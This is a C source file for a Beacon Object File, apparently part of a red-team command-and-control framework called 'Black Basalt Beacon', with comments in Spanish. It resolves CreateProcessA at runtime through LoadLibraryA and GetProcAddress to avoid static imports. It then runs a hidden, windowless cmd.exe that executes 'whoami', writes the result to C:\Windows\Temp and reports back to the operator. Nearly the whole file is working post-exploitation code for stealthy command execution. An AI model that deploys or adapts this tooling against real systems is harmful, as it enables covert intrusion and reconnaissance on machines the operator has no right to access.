/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Black Basalt Beacon is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with Black Basalt Beacon.  If not, see <https://www.gnu.org/licenses/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/

#include <windows.h>
#include "beacon.h"

// Necesitamos CreateProcessA — ¡pero no está en tu tabla!
// → SOLUCIÓN: Usamos LoadLibraryA + GetProcAddress para obtenerlo dinámicamente

extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_CloseHandle;

typedef BOOL (WINAPI *CREATEPROCESSA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

void go(char *args, int alen) {
    HMODULE hKernel32 = (HMODULE)((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    if (!hKernel32) {
        BeaconPrintf(CALLBACK_ERROR, "LoadLibraryA(kernel32.dll) falló\n");
        return;
    }

    CREATEPROCESSA pCreateProcessA = (CREATEPROCESSA)((FARPROC(WINAPI*)(HMODULE,LPCSTR))__imp_GetProcAddress)(
        hKernel32, "CreateProcessA");
    if (!pCreateProcessA) {
        BeaconPrintf(CALLBACK_ERROR, "GetProcAddress(CreateProcessA) falló\n");
        return;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // ¡Ventana oculta!

    char cmd[] = "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt";

    if (!pCreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessA falló\n");
        return;
    }


    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hProcess);
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Proceso oculto ejecutado: 'whoami' → C:\\Windows\\Temp\\whoami.txt\n");
}
